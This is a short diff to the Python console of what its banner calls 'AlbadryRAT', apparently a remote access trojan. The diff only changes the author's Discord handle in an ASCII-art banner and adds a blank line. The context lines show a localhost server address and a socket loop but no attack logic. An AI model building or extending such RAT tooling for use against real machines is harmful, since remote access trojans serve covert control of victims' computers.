@@ -4,7 +4,7 @@ print(f"                   ___________________________")
 print(f"                  |***************************|")
 print(f"                  |***Welcome to AlbadryRAT***|")
 print(f"                  |***************************|")
-print(f"                  |******Discord: mr_7amade***|")
+print(f"                  |*****Discord: albadry_01***|")
 print(f"                  |___________________________|")
 
 server_ip = "127.0.0.1"
@@ -36,3 +36,4 @@ while True:
         break
     
 s.close()
+
